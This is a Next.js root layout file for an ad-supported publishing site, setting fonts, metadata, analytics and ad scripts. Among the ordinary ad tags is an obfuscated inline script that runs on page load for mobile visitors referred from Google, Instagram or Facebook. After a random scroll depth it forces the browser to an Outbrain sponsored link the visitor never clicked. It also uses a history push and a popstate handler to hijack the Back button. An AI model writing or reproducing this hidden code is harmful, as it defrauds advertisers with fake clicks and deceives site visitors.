import Script from "next/script";
import { Roboto_Slab } from "next/font/google";
import { Toaster } from "react-hot-toast";

import type { Metadata } from "next";

import LoadingWrapper from "@/components/wrappers/loading-wrapper";
import { CardImage, description, keywords, title, url } from "@/constant";

import "@/app/globals.css";
import Footer from "@/components/footer/Footer";

export const revalidate = 0;

// Fonts
const poppins = Roboto_Slab({
  subsets: ["latin"],
  display: "swap",
  weight: ["100", "200", "300", "400", "500", "600", "700", "800", "900"],
});

// Meta Data

export const metadata: Metadata = {
  title: `${title}`,
  description: description,
  keywords: keywords,
  robots: "index follow",
  twitter: {
    card: "summary_large_image",
    site: title,
    title: `${title}`,
    description: description,
    images: CardImage,
  },
  openGraph: {
    type: "website",
    siteName: `${title}`,
    description: description,
    url: url,
    countryName: "USA",
    images: CardImage,
  },
  metadataBase: new URL(url),
  alternates: {
    canonical: "/",
  },
  publisher: "Truepub Media",
  icons: "/favicon.ico",
};

// Main HTML
export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" className="scroll-smooth">
      <body className={`${poppins.className} overflow-x-hidden`}>
        <Script
          src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="https://www.googletagmanager.com/gtag/js?id=G-8FYMCYZZN2"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="//widgets.outbrain.com/outbrain.js"
          async
          type="text/javascript"
          strategy="afterInteractive"
        ></Script>
        <Script id="google-analatics">
          {` window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-8FYMCYZZN2');`}
        </Script>
        <Script id="out" strategy="afterInteractive">
          {`const _0x559c88=_0x5955;function _0x5955(_0x2cc351,_0x26c171){const _0x3b45b1=_0x3b45();return _0x5955=function(_0x5955e5,_0x575724){_0x5955e5=_0x5955e5-0x74;let _0x3652d6=_0x3b45b1[_0x5955e5];return _0x3652d6;},_0x5955(_0x2cc351,_0x26c171);}(function(_0x401090,_0x15f06f){const _0x4d256c=_0x5955,_0x42f41e=_0x401090();while(!![]){try{const _0x3d5a75=parseInt(_0x4d256c(0x86))/0x1*(parseInt(_0x4d256c(0x8f))/0x2)+parseInt(_0x4d256c(0x7c))/0x3+parseInt(_0x4d256c(0x7d))/0x4+parseInt(_0x4d256c(0x7e))/0x5*(parseInt(_0x4d256c(0x8c))/0x6)+parseInt(_0x4d256c(0x82))/0x7*(parseInt(_0x4d256c(0x89))/0x8)+-parseInt(_0x4d256c(0x8b))/0x9+-parseInt(_0x4d256c(0x79))/0xa*(parseInt(_0x4d256c(0x74))/0xb);if(_0x3d5a75===_0x15f06f)break;else _0x42f41e['push'](_0x42f41e['shift']());}catch(_0x568895){_0x42f41e['push'](_0x42f41e['shift']());}}}(_0x3b45,0xb6f05));const num=Math['random'](),isMobile=/iPhone|iPad|iPod|Android/i[_0x559c88(0x8e)](navigator[_0x559c88(0x88)]),allowedReferer=[_0x559c88(0x76),'instagram.com',_0x559c88(0x95)];function isFromAllowedReferer(){const _0x344244=_0x559c88,_0x166578=document[_0x344244(0x92)]['toLowerCase']();return allowedReferer[_0x344244(0x93)](_0x5f42c2=>_0x166578[_0x344244(0x83)](_0x5f42c2));}function randomIntFromInterval(_0x3eae9d,_0x34c22c){const _0x42b5b6=_0x559c88;return Math[_0x42b5b6(0x80)](Math[_0x42b5b6(0x94)]()*(_0x34c22c-_0x3eae9d+0x1)+_0x3eae9d);}function _0x3b45(){const _0x4af55d=['google.com','97603ADHolc','location','facebook.com','pushState','href','4180pKXAoC','push','length','2919081XduyuO','5041480hFwRHd','1757650QuSOOk','shadowRoot','floor','children','7wdhKvf','includes','body','log','4297PSPCTe','scroll','userAgent','5344952FJNkan','popstate','283743tmCUZy','12OxSPYY','No\x20shadow\x20roots\x20found.','test','412NmpHgR','addEventListener','forEach','referrer','some','random'];_0x3b45=function(){return _0x4af55d;};return _0x3b45();}const outBrainFunction=()=>{function _0x424aef(){const _0x33afaa=_0x5955,_0x32c5c9=[];function _0x45e556(_0x577dc5){const _0x561c85=_0x5955;_0x577dc5['shadowRoot']&&_0x32c5c9[_0x561c85(0x7a)](_0x577dc5[_0x561c85(0x7f)]);for(const _0x404b4e of _0x577dc5[_0x561c85(0x81)]){_0x45e556(_0x404b4e);}}_0x45e556(document[_0x33afaa(0x84)]),_0x32c5c9[_0x33afaa(0x7b)]>0x0?_0x32c5c9[_0x33afaa(0x91)](_0x1bfa34=>{const _0x32ce17=_0x33afaa,_0x34930d=_0x1bfa34['querySelector']('.ob-dynamic-rec-link');_0x34930d&&(window[_0x32ce17(0x75)][_0x32ce17(0x78)]=_0x34930d[_0x32ce17(0x78)]);}):console[_0x33afaa(0x85)](_0x33afaa(0x8d));}setTimeout(()=>{_0x424aef();},randomIntFromInterval(0x3,0x6)*0x3e8);};if(isFromAllowedReferer()&&isMobile){const randomNumber=Math[_0x559c88(0x80)](Math[_0x559c88(0x94)]()*(0xaf0-0x9c4+0x1))+0x9c4;let run=![];if(num<0.25){}else window[_0x559c88(0x90)](_0x559c88(0x87),()=>{window['scrollY']>=randomNumber&&!run&&(outBrainFunction(),run=!![]);});history[_0x559c88(0x77)](null,null,document['URL']),window[_0x559c88(0x90)](_0x559c88(0x8a),()=>{const _0x33bcc3=_0x559c88;window['location'][_0x33bcc3(0x78)]=window[_0x33bcc3(0x75)][_0x33bcc3(0x78)];});}`}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads" async>
          {`window.googletag = window.googletag || { cmd: [] };
          let interstitialSlot;
          googletag.cmd.push(() => {
            // Define a web interstitial ad slot.
            interstitialSlot = (interstitialSlot = googletag.defineOutOfPageSlot(
              "/22971894985/PM_S_INTERSTITIAL",
              googletag.enums.OutOfPageFormat.INTERSTITIAL
            ));

            // Slot returns null if the page or device does not support interstitials.
            if (interstitialSlot) {
              // Enable optional interstitial triggers and register the slot.
              interstitialSlot.addService(googletag.pubads()).setConfig({
                interstitial: {
                  triggers: {
                    navBar: true,
                    unhideWindow: true,
                  },
                },
              });

              googletag.enableServices();
            }
          });
          `}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads-push" async>
          {`
            googletag.cmd.push(() => {
              googletag.display(interstitialSlot);
            });
          `}
        </Script>
        <Toaster position="top-center" />
        <LoadingWrapper />
        {children}
        <Footer />
      </body>
    </html>
  );
}
